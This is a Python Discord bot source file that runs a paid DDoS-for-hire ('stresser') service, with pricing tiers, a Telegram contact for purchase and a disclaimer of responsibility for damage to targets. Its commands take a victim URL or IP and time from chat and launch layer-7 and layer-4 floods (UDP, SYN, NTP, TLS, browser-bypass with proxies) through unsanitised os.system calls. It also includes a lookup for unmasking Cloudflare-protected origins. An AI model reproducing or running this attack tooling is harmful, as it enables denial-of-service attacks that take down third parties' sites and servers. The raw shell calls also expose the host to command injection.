__author__ = 'Kyle Tran'
__version__ = '1.2'
__github__ = 'github.com/kyletran191'
__license__ = 'GNU General Public License v3.0'
# Kylebot | Discord ddos bot v1.2 | Kyle Tran
#=====Import Module=====#
import os
try:
	import discord
except ImportError:
	os.system("pip install discord")
try:
	import colorama
except ImportError:
	os.system("pip install colorama")
from discord.ext import commands    
from discord.ext.commands import Bot 
import sys, httpx, random, threading
import requests
from os import system        
from os import name                  
from colorama import *                                                
import random, datetime, discord                        
#=====User && Methods Setting=====#
Bronz  = [947738219171155988]  #          
master  = [947738219171155988]  #         
admins  = [947738219171155988]  #   ID users            
owners  = [947738219171155988, 1092946908852523050]  #          
plans = ['bronze', 'master', 'admin']
methods = ['SPAM-REQUEST'] # Methods
servers = 'https://api.juanmarc.my.id/api/v1/event/?c=all'
year_now= datetime.datetime.now().strftime("%Y")     
token   = ''
intents = discord.Intents.default()
intents.members = True 
intents.message_content = True
intents.messages = True
intents.dm_messages = True       
bot     = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")    

#=====Random Color=====#
async def random_color():
    number_lol = random.randint(1, 999999)
    while len(str(number_lol)) != 6:
        number_lol = int(str(f'{random.randint(1, 9)}{number_lol}'))
    return number_lol
#=====Bot Command=====#

@bot.command()
async def start(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Command**", value = f"```yaml\n.method\n.store\n.news\n.ranking```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)
        
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**All Command**", value = f"```yaml\n.start for started bot```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)
        
@bot.command()
async def store(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**Bronze**", value = f"```yaml\nHarga: 20k Per-Bulan\nPlan: (B)\nMax Time: 600detik\nconCurrent: 1x\nApi: false\nAccess: L7/L4\nPrivate Bot: false```")
        embed.add_field(name = "**Master**", value = f"```yaml\nHarga: 50k Per-Bulan\nPlan: (M)\nMax Time: 700detik\nconCurrent: 1x\nApi: false\nAccess: L7/L4\nPrivate Bot: false```")
        embed.add_field(name = "**Admin**", value = f"```yaml\nHarga: 150k Per-Bulan\nPlan: (All)\nMax Time: 1700detik\nconCurrent: 1x\nApi: false\nAccess: L7/L4\nPrivate Bot: 1x\nPlan ini bisa menambah buyers Dengan Maxsimal 3buyers```")
        embed.add_field(name = "**Syntax**", value = f"```yaml\nBeli Hanya Di Admin\nTelegram:@HELLONOPE\nVia: (Dana Qr)\nAdmin Hanya Melayani Pembelian, Selain dari itu mungkin di kacangin, Alasan Admin Mengunakan Qr Adalah untuk menjaga privasi Admin```")
        embed.add_field(name = "**Note**", value = f"```yaml\nSetiap Stresser Memiliki keungulan nya masing² jika Stresser ini memiliki kekurangan Tolong di maafkan Karna di dunia ini Tidak Ada yang nama nya Sempurna Di mata Tuhan. Setiap Pembelian Tidak Akan Di kembalikan Jika Sudah Menggunakan Stresser Kami, Kami Tidak Bertanggung Jawab Jika Terjadi Sesuatu Kepada Target yang di serang, Gunakan Stresser Ini Sebijak Mungkin Agar Terhindar Dari Sesuatu Hal!!\nSetiap Pembelian Akan Mendapatkan 1500Dtik Attack Di freeflood Dan Tambahan Jika Ingin Menambah Waktu Attack Chat Admin di Telegram @HELLONOPE```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)

@bot.command()
async def method(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**Layer7**", value = f"```yaml\nfreeflood (F)\nquery (M)\nstorm (A)\nbrowser (W)```")
        embed.add_field(name = "**Syntax**", value = "```md\n.freeflood <url> <time>\n.query <url> <thread> <time>\n.storm <url> <time>\n.browser <url> <time>```")
        embed.add_field(name = "**Layer4**", value = f"```yaml\nudp\nsyn\nntp\nsamp```")
        embed.add_field(name = "**Syntax**", value = "```md\n.udp <ip> <port>\n.syn <ip> <port>\n.ntp <ip> <port>\n.samp <ip> <port>```")
        embed.add_field(name = "**Tools**", value = f"```yaml\ngeoip\ncfip\ndstat\nwhois```")
        embed.add_field(name = "**Syntax**", value = "```md\n.geoip <ip>\n.cfip <domain>\n.dstat\n.whois <domain/google.com>```")        
        embed.add_field(name = "**NOTE**", value = "> __**Don't spam**__ the attacks or your plan\n > __will be **removed**__.\n\n> Regards, \n> MrZxRX Powerfull")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)

@bot.command()
async def support(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**Support**", value = f"```yaml\n if you have a problem with this bot please chat admin, provide support to\nTelegram:@HELLONOPE\nDiscord:@MrZxRX```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)

@bot.command()
async def ranking(ctx):
        rank = requests.get(f'https://pastebin.com/raw/e49z7qua')
        embed = discord.Embed(title="MrZxRX Powerfull", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**Top All**", value = f"```yaml\n{rank.text}```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)

@bot.command()
async def news(ctx):
        embed = discord.Embed(title="MrZxRX Powerfull", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        embed.add_field(name = "**Top All**", value = f"```yaml\nFreeFlood Have Bypass CfNoSec2```")
        embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
        await ctx.send(embed=embed)
        
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer in buyers:
        await ctx.send(f'{buyer} has already copped a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.append(buyer)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an admin!')

    elif buyer not in buyers:
        await ctx.send(f'{buyer} did not cop a spot!')

    elif buyer is None:
        await ctx.send('Please give a buyer!!')

    else:
        buyers.remove(buyer)
        await ctx.send('Removed him/her!!')
        
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin in admins:
        await ctx.send(f'{admin} is already an admin!')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.append(admin)
        await ctx.send('Added him/her!!')

@bot.command()
async def delete_admin(ctx, admin : int = None):
    if ctx.author.id not in owners:
        await ctx.send(f'Sorry, {ctx.author}, but you aren\'t an owner!')

    elif admin not in admins:
        await ctx.send(f'{admin} is not an admin')

    elif admin is None:
        await ctx.send('Please give an admin!!')

    else:
        admins.remove(admin)
        await ctx.send('Removed him/her!!')

@bot.command()
async def checkhost(ctx, domain : int = None):
    rskskmsm = requests.get(f'https://check-host.net/check-http?host={domain}&max_nodes=3')
    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
    embed.add_field(name = "**Code**", value = f"```yaml\n{rskskmsm.status_code}```")
    embed.add_field(name = "**Domain**", value = f"```yaml\n{domain}```")
    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
    await ctx.send(embed=embed)

@bot.command()
async def flood(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in Bronz: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(600)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nFLOOD```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'go run httpflood.go {victim} 7000 get {time2} nil')

@bot.command()
async def samp(ctx, ip : str = None, port : str = None):
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nSAMP```")
                    embed.add_field(name = "**PORT**", value = f"```yaml\n{port}```")
                    embed.add_field(name = "**IP**", value = f"```yaml\n{ip}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'python2 samp.py {ip} {port}')

@bot.command()
async def geoip(ctx, ip : str = None):
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    embed = discord.Embed(title=f"MrZxRX Powerfull DDOS", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Massege**", value = f"```yaml\n{r.text}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)

@bot.command()
async def whois(ctx, ip : str = None):
                    r = requests.get(f'https://who.juanmarc.my.id/whois.php?d={ip}')
                    embed = discord.Embed(title=f"MrZxRX Powerfull DDOS", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Massege**", value = f"```yaml\n{r.text}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)

@bot.command()
async def cfip(ctx, domain : str = None):
                    URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
                    r = requests.post(URL, data={"cfS": "{domain}"}, headers={"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy) Firefox/2.0.0.8", }, timeout=1)
                    embed = discord.Embed(title=f"MrZxRX Powerfull DDOS", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Massege**", value = f"```yaml\n{r.text}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    
@bot.command()
async def stopall(ctx, domain : str = None):
                    embed = discord.Embed(title=f"MrZxRX Powerfull DDOS", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Massege**", value = f"```yaml\nDONE```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'pkill -f')
                    
@bot.command()
async def dstat(ctx):
                    address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy) Firefox/2.0.0.8", }).text
                    embed = discord.Embed(title=f"MrZxRX Powerfull DDOS", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Massege**", value = f"```yaml\nAttack this {address}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    
@bot.command()
async def udp(ctx, ip : str = None, port : str = None):
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nUDP```")
                    embed.add_field(name = "**PORT**", value = f"```yaml\n{port}```")
                    embed.add_field(name = "**IP**", value = f"```yaml\n{ip}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'python3 udpv2.py {ip} {port} 100 900')

@bot.command()
async def ntp(ctx, ip : str = None, port : str = None):
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nNTP```")
                    embed.add_field(name = "**PORT**", value = f"```yaml\n{port}```")
                    embed.add_field(name = "**IP**", value = f"```yaml\n{ip}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'perl god.pl {ip} {port} 65500 50')

@bot.command()
async def syn(ctx, ip : str = None, port : str = None):
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nSYN```")
                    embed.add_field(name = "**PORT**", value = f"```yaml\n{port}```")
                    embed.add_field(name = "**IP**", value = f"```yaml\n{ip}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'perl destroy.pl {ip} {port} 65500 50')

@bot.command()
async def tlsrand(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in master: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(700)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nTLSRAND```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node tlsrandoms.js {victim} {time2} 200 7000 socks.txt')

@bot.command()
async def query(ctx, victim : str = None, thread : str = None, time : str = None):
    if ctx.author.id not in master: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif thread is None:
            embed = discord.Embed(title="Error!", description=f"You need a thread! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(700)
                max_thread = int(50000)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                if int(thread) > max_thread:
                    thread2 = max_thread
                else:
                    thread2 = int(thread)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nQUERY```")
                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node tls.js {victim} {time2} {thread2} GET')

@bot.command()
async def bwserv2(ctx, victim : str = None, time : str = None, token : str = None):
    if ctx.author.id not in master: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif token is None:
            embed = discord.Embed(title="Error!", description=f"You need a token! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(700)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nBrowser-V2```")
                    embed.add_field(name = "**Token**", value = f"```yaml\n{token}```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node BROWSER-BYPASS/index.js {victim} --humanization true --mode tlsfl --precheck false --proxy proxy.txt --time {time2} --pool 20 --uptime 15000 --workers 50 --proxylen 3650 --delay 25000 --junk true --pipe 500 --rate 64 --captcha true')

@bot.command()
async def freeflood(ctx, victim : str = None, time : str = None):
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(50)
                if int(time) > max_time:
                    time2 = max_time
                    embed = discord.Embed(title="Error!", description=f"max time! 1/50! beli plan untuk menambah Waktu{ctx.author.mention}", color=await random_color())
                    await ctx.send(embed=embed)
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nFREE```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node kylie.js {victim} {time2}')
                    

@bot.command()
async def brust(ctx, victim : str = None, time : str = None):
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(200)
                if int(time) > max_time:
                    time2 = max_time
                    embed = discord.Embed(title="Error!", description=f"max time! 1/200! beli plan untuk menambah Waktu{ctx.author.mention}", color=await random_color())
                    await ctx.send(embed=embed)
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nBRUST```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX\nJoin Telegram: https://t.me/MrzxRX")
                    await ctx.send(embed=embed)
                    system(f'python3 ddos/ddos brust {victim} 5 1000 socks.txt 100 {time2}')
                    
@bot.command()
async def browser(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in owners: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(300)
                if int(time) > max_time:
                    time2 = max_time
                    embed = discord.Embed(title="Error!", description=f"Max Time 300s! {ctx.author.mention}", color=await random_color())
                    await ctx.send(embed=embed)
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nBROWSER```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Method**", value = f"```yaml\nGET```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node bypass.py {victim} 1000 {time2}')

@bot.command()
async def slow(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in Bronz: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(600)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nSLOW```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node slow.js {victim} {time2}')
                    
@bot.command()
async def cookie(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in Bronz: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(600)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nCOOKIE```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.add_field(name = "**Cookie**", value = f"```yaml\nRandom```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'python3 ddos/ddos cookie {victim} 5 1000 socks.txt 100 {time2}')

@bot.command()
async def gsb(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in Bronz: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(600)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nGSB```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'python3 ddos/ddos gsb {victim} 5 1000 socks.txt 100 {time2}')

@bot.command()
async def ovh(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in Bronz: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(600)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nOVH```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'python3 ddos/ddos stress {victim} 5 1000 socks.txt 1000 {time2}')

@bot.command()
async def storm(ctx, victim : str = None, time : str = None):
    if ctx.author.id not in admins: 
        embed = discord.Embed(title=f"Error! ", description="Sorry, you need to buy a spot!", color=await random_color())
        await ctx.send(embed=embed)
    else:
        if victim is None:
            embed = discord.Embed(title="Error!", description=f"You need a url! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        elif time is None:
            embed = discord.Embed(title="Error!", description=f"You need a time! {ctx.author.mention}", color=await random_color())
            await ctx.send(embed=embed)
        else:
                max_time = int(1500)
                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)
                    embed = discord.Embed(title=f"MrZxRX Powerfull | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                    embed.add_field(name = "**Method**", value = f"```yaml\nSTORM```")
                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
                    embed.add_field(name = "**PORT**", value = f"```yaml\n80```")
                    embed.set_footer(text = f"©{year_now} Copyright MrZxRX.")
                    await ctx.send(embed=embed)
                    system(f'node HTTP-RAND.js {victim} {time2}')
           

@bot.event
async def on_ready():
    if name == 'nt':
        system('cls')
    else:
        system('clear')
    print('Connected...')
    print(f'\033[1;97mLogged \033[1;96m{bot.user.name}')
    print(f'\033[1;97mBot ID: \033[1;97m{bot.user.id}')
    print('\033[1;97m=============================================================')
    
    if str(len(bot.guilds)) == 1:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
    else:
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
if __name__ == '__main__':
    init(convert=True)
    bot.run(token)
